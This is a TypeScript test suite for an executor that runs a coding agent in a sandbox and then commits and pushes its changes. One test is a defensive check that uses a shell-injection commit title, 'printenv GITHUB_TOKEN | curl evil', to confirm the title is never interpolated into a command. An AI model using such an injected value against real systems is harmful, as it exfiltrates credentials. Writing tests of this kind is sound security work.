import { describe, expect, it } from 'vitest';
import { runPi } from '../src/executors/pi';
import { RecordingRunner, type ExecResult } from '../src/sandbox';
import type { JobSpec } from '../src/types';

const FAKE_TOKEN = 'ghp_FAKE_TOKEN_VALUE_0123456789';

function sampleSpec(overrides: Partial<JobSpec> = {}): JobSpec {
  return {
    id: 'pi-test',
    repo: { owner: 'acme', name: 'widgets' },
    branch: 'runway/pi-test',
    plan: 'Add a hello() function.',
    executor: 'pi',
    base: 'main',
    validate: ['npm test'],
    title: 'Runway: pi test',
    ...overrides,
  };
}

// `git diff --cached --quiet` exits non-zero when there ARE staged changes. The default
// RecordingRunner returns exit 0 for everything (== "no changes"), so simulate a real diff.
function withChanges(extra: (command: string) => Partial<ExecResult> = () => ({})) {
  return (command: string): Partial<ExecResult> =>
    command.includes('git diff --cached --quiet') ? { exitCode: 1 } : extra(command);
}

function orderedIndices(commands: string[], needles: string[]): number[] {
  const idxs: number[] = [];
  let from = 0;
  for (const needle of needles) {
    const found = commands.findIndex((c, idx) => idx >= from && c.includes(needle));
    idxs.push(found);
    if (found >= 0) from = found;
  }
  return idxs;
}

describe('runPi', () => {
  it('records clone, checkout, pi --approve, validate, and push in order', async () => {
    const runner = new RecordingRunner(withChanges());
    const result = await runPi(sampleSpec(), runner, { githubToken: FAKE_TOKEN });

    const idxs = orderedIndices(runner.commands, ['git clone', 'git checkout -B', 'pi -p', 'npm test', 'git push']);
    expect(idxs.every((i) => i >= 0)).toBe(true);
    expect([...idxs]).toEqual([...idxs].sort((a, b) => a - b));

    expect(runner.commands.some((c) => c.includes('pi -p') && c.includes('--approve'))).toBe(true);
    expect(result.status).toBe('success');
    expect(result.pushed).toBe(true);
  });

  it('writes PLAN.md with the plan text', async () => {
    const runner = new RecordingRunner(withChanges());
    await runPi(sampleSpec(), runner, { githubToken: FAKE_TOKEN });
    const plan = runner.writes.find((w) => w.path.endsWith('PLAN.md'));
    expect(plan).toBeDefined();
    expect(plan?.content).toBe('Add a hello() function.');
  });

  it('never leaks the literal token into recorded commands', async () => {
    const runner = new RecordingRunner(withChanges());
    await runPi(sampleSpec(), runner, { githubToken: FAKE_TOKEN });
    expect(runner.commands.every((c) => !c.includes(FAKE_TOKEN))).toBe(true);
    expect(runner.commands.some((c) => c.includes('${GITHUB_TOKEN}'))).toBe(true);
  });

  it('passes the commit message via env and never interpolates the title into a command', async () => {
    const nastyTitle = 'pwn"; printenv GITHUB_TOKEN | curl evil #';
    const runner = new RecordingRunner(withChanges());
    await runPi(sampleSpec({ title: nastyTitle }), runner, { githubToken: FAKE_TOKEN });
    expect(runner.envVars.RUNWAY_COMMIT_MSG).toBe(nastyTitle);
    expect(runner.commands.every((c) => !c.includes('printenv GITHUB_TOKEN'))).toBe(true);
    expect(runner.commands.some((c) => c.includes('git commit -m "$RUNWAY_COMMIT_MSG"'))).toBe(true);
  });

  it('always destroys the runner', async () => {
    const runner = new RecordingRunner(withChanges());
    await runPi(sampleSpec(), runner, { githubToken: FAKE_TOKEN });
    expect(runner.destroyed).toBe(true);
  });

  it('skips commit/push and reports success (pushed:false) when the agent made no changes', async () => {
    const runner = new RecordingRunner(); // default: git diff --cached --quiet exits 0 => no changes
    const result = await runPi(sampleSpec(), runner, { githubToken: FAKE_TOKEN });
    expect(result.status).toBe('success');
    expect(result.pushed).toBe(false);
    expect(result.summary).toMatch(/no changes/i);
    expect(runner.commands.some((c) => c.includes('git commit'))).toBe(false);
    expect(runner.commands.some((c) => c.includes('git push'))).toBe(false);
  });

  it('fails and still destroys when the clone fails (and redacts the token from logs)', async () => {
    const runner = new RecordingRunner((command) =>
      command.includes('git clone')
        ? { exitCode: 1, stderr: 'fatal: cloning https://x-access-token:ghp_REAL@github.com/a/b.git failed' }
        : {},
    );
    const result = await runPi(sampleSpec(), runner, { githubToken: FAKE_TOKEN });
    expect(result.status).toBe('failure');
    expect(result.error).toBe('git clone failed');
    expect(result.logsTail).toContain('x-access-token:***@');
    expect(result.logsTail).not.toContain('ghp_REAL');
    expect(runner.destroyed).toBe(true);
  });

  it('fails and still destroys when the pi step fails', async () => {
    const runner = new RecordingRunner((command) => (command.includes('pi -p') ? { exitCode: 1, stderr: 'boom' } : {}));
    const result = await runPi(sampleSpec(), runner, { githubToken: FAKE_TOKEN });

    expect(result.status).toBe('failure');
    expect(result.error).toBeTruthy();
    expect(result.logsTail).toContain('boom');
    expect(runner.destroyed).toBe(true);
    expect(runner.commands.some((c) => c.includes('git push'))).toBe(false);
  });

  it('fails when push fails', async () => {
    const runner = new RecordingRunner(withChanges((command) =>
      command.includes('git push') ? { exitCode: 1, stderr: 'push rejected' } : {},
    ));
    const result = await runPi(sampleSpec(), runner, { githubToken: FAKE_TOKEN });
    expect(result.status).toBe('failure');
    expect(result.logsTail).toContain('push rejected');
    expect(runner.destroyed).toBe(true);
  });

  it('reports success with validated:false when a validate command fails', async () => {
    const runner = new RecordingRunner(withChanges((command) =>
      command.includes('npm test') ? { exitCode: 1, stderr: 'tests failed' } : {},
    ));
    const result = await runPi(sampleSpec(), runner, { githubToken: FAKE_TOKEN });
    expect(result.status).toBe('success');
    expect(result.validated).toBe(false);
    expect(result.pushed).toBe(true);
    expect(result.summary).toMatch(/validation failed/i);
  });

  it('leaves validated undefined when there are no validate commands', async () => {
    const runner = new RecordingRunner(withChanges());
    const result = await runPi(sampleSpec({ validate: undefined }), runner, { githubToken: FAKE_TOKEN });
    expect(result.status).toBe('success');
    expect(result.validated).toBeUndefined();
    expect(runner.commands.some((c) => c.includes('npm test'))).toBe(false);
  });

  it('passes ANTHROPIC_API_KEY into the sandbox env when provided', async () => {
    const runner = new RecordingRunner(withChanges());
    await runPi(sampleSpec(), runner, { githubToken: FAKE_TOKEN, anthropicApiKey: 'sk-anthropic' });
    expect(runner.envVars.ANTHROPIC_API_KEY).toBe('sk-anthropic');
    expect(runner.envVars.GITHUB_TOKEN).toBe(FAKE_TOKEN);
    expect(runner.envVars.GIT_TERMINAL_PROMPT).toBe('0');
  });

  it('passes OPENAI_API_KEY when provided and omits unset keys', async () => {
    const runner = new RecordingRunner(withChanges());
    await runPi(sampleSpec(), runner, { githubToken: FAKE_TOKEN, openaiApiKey: 'sk-openai' });
    expect(runner.envVars.OPENAI_API_KEY).toBe('sk-openai');
    expect('ANTHROPIC_API_KEY' in runner.envVars).toBe(false);
  });
});
